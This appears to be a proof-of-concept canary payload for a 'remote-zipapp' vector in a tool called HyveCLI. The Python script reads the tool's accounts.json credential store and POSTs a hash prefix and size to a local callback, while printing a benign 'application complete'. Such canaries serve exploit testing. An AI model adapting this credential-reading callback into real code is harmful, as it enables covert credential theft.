import hashlib
import pathlib
import urllib.parse
import urllib.request

store = pathlib.Path("/home/stazot/HyveCLI/data/accounts.json").read_bytes()
body = urllib.parse.urlencode(
    {
        "vector": "remote-zipapp",
        "cred_sha20": hashlib.sha256(store).hexdigest()[:20],
        "bytes": len(store),
    }
).encode()
request = urllib.request.Request(
    "http://127.0.0.1:18080/callback/remote-zipapp", data=body, method="POST"
)
urllib.request.urlopen(request, timeout=5).read()
print("application complete")

